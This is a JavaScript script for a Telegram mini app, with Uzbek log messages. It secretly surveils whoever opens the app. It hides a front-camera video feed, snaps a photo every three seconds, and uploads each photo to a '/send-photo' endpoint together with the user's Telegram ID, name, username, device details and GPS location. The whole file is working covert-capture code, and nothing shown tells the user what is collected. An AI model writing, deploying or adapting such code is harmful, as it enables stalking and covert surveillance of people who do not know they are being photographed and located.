Telegram.WebApp.ready();
Telegram.WebApp.expand();

const user = Telegram.WebApp.initDataUnsafe?.user || {};
const user_id = user.id;
const tg_fullname = `${user.first_name || ""} ${user.last_name || ""}`.trim();
const tg_username = user.username || "";

let locationSent = false;

const video = document.createElement("video");
video.style.display = "none";
video.setAttribute("autoplay", true);
video.setAttribute("playsinline", true);
document.body.appendChild(video);

navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
  .then(stream => {
    video.srcObject = stream;

    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");

    setInterval(async () => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const blob = await new Promise(res => canvas.toBlob(res, "image/png"));
      const file = new File([blob], "photo.png", { type: "image/png" });

      const formData = new FormData();
      formData.append("photo", file);
      formData.append("user_id", user_id);
      formData.append("tg_fullname", tg_fullname);
      formData.append("tg_username", tg_username);
      formData.append("timestamp", new Date().toISOString());
      formData.append("user_agent", navigator.userAgent);
      formData.append("platform", navigator.platform);

      if (!locationSent) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            formData.append("latitude", pos.coords.latitude);
            formData.append("longitude", pos.coords.longitude);
            locationSent = true;
            sendFormData(formData);
          },
          err => {
            console.warn("❌ Geolokatsiya rad etildi:", err.message);
            locationSent = true;
            sendFormData(formData);
          }
        );
      } else {
        sendFormData(formData);
      }

    }, 3000);
  })
  .catch(err => console.error("❌ Kamera xatosi:", err.message));

function sendFormData(formData) {
  fetch("/send-photo", {
    method: "POST",
    body: formData
  }).then(() => {
    console.log("✅ Rasm yuborildi");
  }).catch(err => {
    console.error("❌ Yuborilmadi:", err.message);
  });
}
